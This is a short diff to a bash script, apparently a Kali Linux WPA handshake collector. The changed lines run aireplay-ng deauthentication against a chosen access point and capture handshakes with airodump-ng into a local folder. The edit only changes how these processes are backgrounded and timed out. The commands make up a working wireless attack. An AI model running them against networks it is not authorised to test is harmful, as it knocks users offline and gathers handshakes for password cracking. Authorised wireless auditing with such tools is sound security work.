@@ -106,9 +106,8 @@ active() {
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
 
           iwconfig $interface channel $Channel
-          aireplay-ng -a $BSSID -0 5 $interface &> /dev/null &
-          timeout --foreground 10s airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null
-          kill $! &> /dev/null
+          aireplay-ng -a $BSSID -0 5 $interface
+          timeout 10s airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null
           checkHandshakes
           rm /home/kali/hscollector/shakes-* >/dev/null
           
